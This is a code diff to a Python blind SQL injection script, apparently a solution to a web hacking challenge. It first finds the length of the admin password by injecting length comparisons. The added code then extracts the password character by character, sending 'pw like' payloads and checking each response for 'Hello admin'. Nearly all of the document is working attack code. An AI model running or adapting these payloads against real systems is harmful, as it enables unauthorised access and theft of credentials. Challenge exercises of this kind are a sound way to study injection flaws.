@@ -37,10 +37,33 @@ print("password length find start!!")
 for i in range(1, 50) :    
     # pw=/*&no=0x2a2f0a or id like 0x61646d696e and length(pw) > 9
     param = f"pw=/*&no=0x2a2f0a or id like 0x61646d696e and length(pw) > {i}"
-    res = s.get(host + parse.quote(param), cookies=cookies)
-    print(res.text)
+    res = s.get(host + (param), cookies=cookies)
     if "Hello admin" not in res.text :
         print(f"password length is {i}")
         password_length = i
         break 
 print("password length find end !!")
+
+temp = chr(48)
+temp2 = temp.encode("utf-8")
+temp3 = temp2.hex()
+print(temp3)
+
+print("password inject start !! ")
+admin_password = ""
+for i in range(1, password_length + 1) :
+    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
+        # pw=/*&no=0x2a2f0a or id like 0x61646d696e and pw like 0x27312527
+
+        param = f"'||id like 'admin' && pw like '{admin_password}{chr(j)}%' -- -"
+        #param = f"'||id like 'admin' && ascii(substr(pw, {str(i)}, 1)) like {str(j)} -- -"
+        res = s.get(host + parse.quote(param), cookies=cookies)
+        if "No Hack ~_~" in res.text :
+          print("no use prob keyword")
+          break
+        if "Hello admin" in res.text :
+          admin_password += chr(j)            
+          break
+    print(f"now password ... {admin_password}")
+
+print("password inject end !! ")
